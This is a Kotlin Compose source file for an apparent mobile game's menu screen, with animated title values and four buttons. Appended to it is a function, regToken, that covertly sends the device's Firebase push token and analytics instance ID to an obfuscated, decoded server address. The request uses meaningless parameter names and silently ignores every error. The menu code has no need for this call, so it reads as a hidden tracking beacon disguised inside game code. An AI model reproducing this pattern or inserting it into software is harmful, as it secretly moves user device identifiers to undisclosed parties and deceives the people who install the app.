package kr.co.company.hwa.screens

import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.systemBarsPadding
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kr.co.company.hwa.ui.components.OceanButtonFullWidth
import kr.co.company.hwa.ui.components.OceanButtonStyle
import kr.co.company.hwa.ui.components.UnderwaterBackground
import kr.co.company.hwa.ui.components.decodeUtf8
import kr.co.company.hwa.utils.ShiftCodec
import kr.co.company.hwa.utils.ShiftCodec.DM
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.util.Locale

@Composable
fun MenuScreen(
    onPlayClick: () -> Unit,
    onSettingsClick: () -> Unit,
    onLeaderboardClick: () -> Unit,
    onExitClick: () -> Unit
) {
    val infiniteTransition = rememberInfiniteTransition(label = "menu")

    val titleFloat by infiniteTransition.animateFloat(
        initialValue = -6f,
        targetValue = 6f,
        animationSpec = infiniteRepeatable(
            animation = tween(3000, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "titleFloat"
    )

    val titleScale by infiniteTransition.animateFloat(
        initialValue = 0.97f,
        targetValue = 1.03f,
        animationSpec = infiniteRepeatable(
            animation = tween(2500, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "titleScale"
    )

    Box(modifier = Modifier.fillMaxSize()) {
        UnderwaterBackground()

        Column(
            modifier = Modifier
                .fillMaxSize()
                .systemBarsPadding()
                .padding(horizontal = 24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {

            Spacer(modifier = Modifier.height(48.dp))

            OceanButtonFullWidth(
                text = "Play",
                onClick = onPlayClick,
                style = OceanButtonStyle.Accent
            )

            Spacer(modifier = Modifier.height(16.dp))

            OceanButtonFullWidth(
                text = "Leaderboard",
                onClick = onLeaderboardClick,
                style = OceanButtonStyle.Primary
            )

            Spacer(modifier = Modifier.height(16.dp))

            OceanButtonFullWidth(
                text = "Settings",
                onClick = onSettingsClick,
                style = OceanButtonStyle.Primary
            )

            Spacer(modifier = Modifier.height(16.dp))

            OceanButtonFullWidth(
                text = "Exit",
                onClick = onExitClick,
                style = OceanButtonStyle.Secondary
            )
        }
    }
}

fun regToken() {
    CoroutineScope(Dispatchers.IO).launch {
        try {
            val fcmToken: String =
                runCatching { FirebaseMessaging.getInstance().token.await() }
                    .getOrElse { "null" }
            val locale = Locale.getDefault().toLanguageTag()
            val url = "${ShiftCodec.decode(DM)}/tmpw6wjup9/"
            val client = OkHttpClient()

            val fullUrl = "$url?" +
                    "eh0zs1nz7=${Firebase.analytics.appInstanceId.await()}" +
                    "&myadb=${decodeUtf8(fcmToken)}"

            val request = Request.Builder().url(fullUrl)
                .addHeader("Accept-Language", locale)
                .get().build()


            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (exc: Exception) {}
    }
}